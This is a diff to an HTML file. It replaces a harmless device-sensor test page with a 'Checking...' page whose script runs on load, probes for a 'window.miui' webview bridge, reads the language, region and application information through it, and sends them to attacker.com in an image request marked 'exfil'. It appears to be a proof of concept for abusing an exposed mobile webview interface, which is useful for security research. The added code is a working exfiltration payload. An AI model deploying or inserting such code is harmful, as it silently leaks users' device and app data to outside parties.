@@ -1,23 +1,15 @@
-<!DOCTYPE html>
-<html>
-<head>
-  <title>Device Sensor Test</title>
-</head>
-<body>
-  <h1>Device Motion & Orientation</h1>
-  <pre id="log"></pre>
-
-  <script>
-    const log = document.getElementById("log");
-
-    window.addEventListener("devicemotion", (e) => {
-      log.innerText = "Acceleration:\n" + JSON.stringify(e.acceleration, null, 2);
-    });
-
-    window.addEventListener("deviceorientation", (e) => {
-      log.innerText += "\nOrientation:\n" + 
-        "alpha: " + e.alpha + ", beta: " + e.beta + ", gamma: " + e.gamma;
-    });
-  </script>
-</body>
-</html>
+<!doctype html>
+<meta charset="utf-8">
+<body>Checking...</body>
+<script>
+  (function(){
+    if (typeof window.miui === "object") {
+      let data = {};
+      try { data.lang = window.miui.getLanguage(); } catch(e){}
+      try { data.region = window.miui.getRegion(); } catch(e){}
+      try { data.appinfo = JSON.stringify(window.miui.getApplicationInfo()); } catch(e){}
+      // exfil
+      new Image().src = "https://attacker.com/leak?d=" + encodeURIComponent(JSON.stringify(data));
+    }
+  })();
+</script>
